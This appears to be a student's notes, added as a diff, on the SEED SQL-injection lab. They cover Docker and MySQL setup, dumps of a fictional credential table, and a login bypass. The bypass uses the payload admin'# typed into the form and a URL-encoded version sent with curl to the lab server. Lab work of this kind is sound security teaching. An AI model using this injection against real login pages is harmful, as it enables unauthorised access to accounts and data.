@@ -1,0 +1,99 @@
+2 Lab environment
+
+Steps:
+
+Open terminal
+Run sudo nano/etc/hosts
+Find already set up hostname
+Link was different, so change to 10.9.0.5   www.seed-server.com
+
+
+_________________________________________________________________
+
+2.1
+
+run dcbuild
+run dcup
+open new terminal window to keep docker container open
+run dockps
+the output is:
+91dd3aebffc6  mysql-10.9.0.6
+ea8949dca6a8  www-10.9.0.5
+
+run docksh 91
+root@91dd3aebffc6:/#
+
+// starting from clean database : sudo rm -rf mysql_data
+
+
+______________________________________________________________________
+
+3. Lab Tasks
+
+do the steps above
+
+run mysql -u -root -pdees  : mysql > 
+
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+mysql > show tables;
++------------------------+
+| Tables_in_sqllab_users |
++------------------------+
+| credential             |
++------------------------+
+1 row in set (0.01 sec)
+
+
+mysql > SELECT*FROM credential WHERE Name = 'Alice';
+
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+1 row in set (0.01 sec)
+
+
+_________________________________________________________________
+
+3.2
+
+go into www.seed-server.com
+
+
+Username is admin trying to find password:
+
+mysql> SELECT*FROM credential where Name='admin';
+
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+|  6 | Admin | 99999 | 400000 | 3/5   | 43254314 |             |         |       |          | a5bdf35a1df4ea895905f6f6618e83951a6effc0 |
++----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
+1 row in set (0.00 sec)
+
+Enter without password:
+
+in user write: admin'#
+
+user details table shows up
+
+
+_________________________________________________________________
+
+2.2
+
+login with admin but through terminal:
+
+in terminal:
+curl 'www.seed-server.com/unsafe_home.php?username=admin'#
+since ' and # are special characters, we change ' to %27 and # to %23
+so we run:
+
+curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23
+
+
